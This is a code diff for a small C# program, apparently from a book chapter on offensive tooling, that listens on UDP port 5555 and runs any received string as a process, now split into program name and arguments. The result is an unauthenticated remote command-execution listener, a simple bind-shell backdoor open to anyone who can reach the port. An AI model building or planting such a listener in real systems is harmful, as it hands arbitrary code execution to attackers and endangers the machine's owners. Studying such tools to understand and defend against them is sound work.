@@ -13,7 +13,7 @@ namespace ch4_udp_server
 			int lport = 5555;
 			UdpClient listener = new UdpClient(lport);
 			IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, lport);
-			string command;
+			string cmd;
 			byte[] input;
 
 			try
@@ -21,15 +21,25 @@ namespace ch4_udp_server
 				while (true)
 				{
 					input = listener.Receive(ref groupEP);
-					command = Encoding.ASCII.GetString(input, 0, input.Length);
+					cmd = Encoding.ASCII.GetString(input, 0, input.Length);
 
-					if (command == string.Empty)
+					if (cmd == string.Empty)
 						break;
 						
+					string filename = string.Empty;
+					string arg = string.Empty;
+
+					if (cmd.IndexOf(' ') > 0) { 
+						filename = cmd.Substring(0, cmd.IndexOf(' '));
+						arg = cmd.Substring(cmd.IndexOf(' '), cmd.Length - filename.Length);
+					} else {
+						filename = cmd;
+					}
+
 					Process prc = new Process();
 					prc.StartInfo = new ProcessStartInfo();
-					prc.StartInfo.FileName = command;
-					prc.StartInfo.Arguments = "";
+					prc.StartInfo.FileName = filename;
+					prc.StartInfo.Arguments = arg;
 					prc.StartInfo.UseShellExecute = false;
 					prc.StartInfo.RedirectStandardOutput = true;
 					prc.Start();
